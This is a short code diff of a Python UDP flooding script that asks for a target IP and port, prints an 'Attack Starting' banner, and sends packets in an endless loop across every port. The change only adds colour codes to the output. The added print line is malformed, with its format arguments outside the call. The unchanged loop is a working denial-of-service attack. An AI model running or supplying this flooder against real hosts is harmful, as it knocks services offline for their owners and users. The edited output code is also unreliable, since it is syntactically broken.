@@ -32,21 +32,21 @@ port = input("Port       : ")
 
 os.system("clear")
 os.system("fade Attack Starting")
-print("[                    ] 0% ")
+print("[\033[30m------------]\033[36m 0%")
 time.sleep(5)
-print("[=====               ] 25%")
+print("[\033[30m------------]\033[35m 25%")
 time.sleep(5)
-print("[==========          ] 50%")
+print("[\033[30m------------]\033[34m 50%")
 time.sleep(5)
-print("[===============     ] 75%")
+print("[\033[30m------------]\033[37m 75%")
 time.sleep(5)
-print("[====================] 100%")
+print("[\033[30m------------]\033[4m 100%")
 time.sleep(3)
 sent = 0
 while True:
      sock.sendto(bytes, (ip,port))
      sent = sent + 1
      port = port + 1
-     print("Sent %s packet to %s throught port:%s"%(sent,ip,port))
+     print("\033[92mCanal Sent %s \033[1mPacket to %s \033[92mThrought port:%s\033[0m")%(sent,ip,port))
      if port == 65534:
        port = 1
